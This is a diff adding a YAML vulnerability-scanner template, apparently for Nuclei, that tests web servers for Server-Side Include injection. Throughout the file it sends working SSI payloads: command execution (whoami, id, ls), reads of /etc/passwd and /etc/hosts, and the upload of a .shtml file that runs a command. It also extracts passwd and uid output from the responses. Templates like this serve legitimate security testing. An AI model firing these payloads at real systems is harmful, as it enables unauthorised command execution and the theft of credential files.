@@ -1,0 +1,243 @@
+id: medium-webapp-server-side-include-ssi-injection
+
+info:
+  name: Server-Side Include (SSI) Injection
+  author: redteam-elite
+  severity: high
+  description: |
+    Detects Server-Side Include injection vulnerabilities that allow command execution.
+    Tests various SSI directives and bypass techniques used in red team operations.
+  reference:
+    - https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection
+    - https://book.hacktricks.xyz/pentesting-web/ssi-server-side-includes-edge-side-includes-injection
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-97
+  metadata:
+    verified: true
+    max-request: 15
+  tags: ssi,injection,rce,server-side,redteam
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.shtml?page=<!--#exec cmd=\"whoami\"-->"
+      - "{{BaseURL}}/search.shtml?q=<!--#exec cmd=\"id\"-->"
+      - "{{BaseURL}}/contact.shtml?msg=<!--#exec cmd=\"uname -a\"-->"
+
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "root"
+          - "www-data"
+          - "apache"
+          - "nginx"
+          - "uid="
+          - "gid="
+          - "Linux"
+          - "Darwin"
+        condition: or
+
+      - type: word
+        words:
+          - "exec cmd"
+          - "<!--#"
+        negative: true
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/comment"
+      - "{{BaseURL}}/feedback"
+      - "{{BaseURL}}/contact"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    body: |
+      comment=<!--#exec cmd="cat /etc/passwd"-->&name=test
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "root:x:0:0"
+          - "/bin/bash"
+          - "/bin/sh"
+          - "daemon:"
+          - "nobody:"
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/page.shtml?include=<!--#include file=\"/etc/hosts\"-->"
+      - "{{BaseURL}}/template.shtml?file=<!--#include virtual=\"/etc/passwd\"-->"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "127.0.0.1"
+          - "localhost"
+          - "root:x:"
+          - "/bin/"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/search"
+      - "{{BaseURL}}/api/search"
+
+    headers:
+      Content-Type: application/json
+
+    body: |
+      {"query":"<!--#echo var=\"DOCUMENT_ROOT\"-->"}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "/var/www"
+          - "/usr/share"
+          - "/home/"
+          - "htdocs"
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/info.shtml?cmd=<!--#exec cmd=\"ls -la\"-->"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "drwx"
+          - "total"
+          - "-rw-"
+          - "index."
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/upload"
+      - "{{BaseURL}}/file/upload"
+
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+
+    body: |
+      ------WebKitFormBoundary7MA4YWxkTrZu0gW
+      Content-Disposition: form-data; name="file"; filename="test.shtml"
+      Content-Type: text/html
+
+      <!--#exec cmd="whoami"-->
+      ------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+
+      - type: word
+        words:
+          - "uploaded"
+          - "success"
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/uploads/test.shtml"
+      - "{{BaseURL}}/files/test.shtml"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "www-data"
+          - "apache"
+          - "root"
+          - "nginx"
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/page.shtml?var=<!--#set var=\"test\" value=\"`whoami`\"--><!--#echo var=\"test\"-->"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "www-data"
+          - "apache"
+          - "root"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/form"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    body: |
+      input=<!--#config timefmt="%A %B %d, %Y"--><!--#echo var="DATE_LOCAL"-->
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "Monday"
+          - "Tuesday"
+          - "Wednesday"
+          - "Thursday"
+          - "Friday"
+          - "Saturday"
+          - "Sunday"
+        condition: or
+
+    extractors:
+      - type: regex
+        name: command_output
+        regex:
+          - '(?i)(root:x:0:0:[^:]*:[^:]*:[^\r\n]*)'
+          - '(?i)(uid=[0-9]+\([^)]+\)\s+gid=[0-9]+\([^)]+\))'
+        group: 1
